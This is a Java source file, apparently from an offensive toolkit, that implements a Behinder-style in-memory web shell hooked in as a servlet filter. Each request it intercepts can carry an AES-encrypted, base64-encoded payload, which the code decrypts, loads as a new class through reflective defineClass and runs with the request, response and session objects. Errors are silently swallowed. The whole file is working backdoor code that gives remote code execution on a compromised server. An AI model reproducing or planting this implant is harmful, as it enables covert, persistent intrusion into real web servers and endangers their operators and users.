package com.ppp.middleware.memshell;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;
import sun.misc.BASE64Decoder;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Whoopsunix
 * <p>
 */
@MemShell(MemShell.Filter)
@MemShellFunction(MemShellFunction.Behinder)
@JavaClassModifiable({JavaClassModifiable.pass})
public class FilterBehinder implements InvocationHandler {
    private static String pass;
    public Object invoke(Object proxy, Method method, Object[] args) {
        if (method.getName().equals("doFilter")) {
            run(args[0], args[1], args[2]);
        }
        return null;
    }

    private void run(Object servletRequest, Object servletResponse, Object filterChain) {
        try {
            Object session = invokeMethod(servletRequest.getClass().getSuperclass(), servletRequest, "getSession", new Class[]{}, new Object[]{});
            Map<String, Object> pageContext = new HashMap<String, Object>();
            pageContext.put("session", session);
            pageContext.put("request", servletRequest);
            pageContext.put("response", servletResponse);
            invokeMethod(session.getClass(), session, "putValue", new Class[]{String.class, Object.class}, new Object[]{"u", pass});

            Object c = invokeMethod(Class.forName("javax.crypto.Cipher"), null, "getInstance", new Class[]{String.class}, new Object[]{"AES"});
            invokeMethod(c.getClass(), c, "init", new Class[]{int.class, Class.forName("java.security.Key")}, new Object[]{2, Class.forName("javax.crypto.spec.SecretKeySpec").getDeclaredConstructor(byte[].class, String.class).newInstance(pass.getBytes(), "AES")});
            Object reader = invokeMethod(servletRequest.getClass(), servletRequest, "getReader", new Class[]{}, new Object[]{});
            String str = (String) invokeMethod(reader.getClass(), reader, "readLine", new Class[]{}, new Object[]{});
            byte[] bytes = (byte[]) invokeMethod(c.getClass(), c, "doFinal", new Class[]{byte[].class}, new Object[]{new BASE64Decoder().decodeBuffer(str)});

            Class clazz = defClass(bytes);
            clazz.newInstance().equals(pageContext);
        } catch (Throwable e) {

        }

    }

    public Class defClass(byte[] classBytes) throws Throwable {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defMethod.setAccessible(true);
        return (Class) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }
}
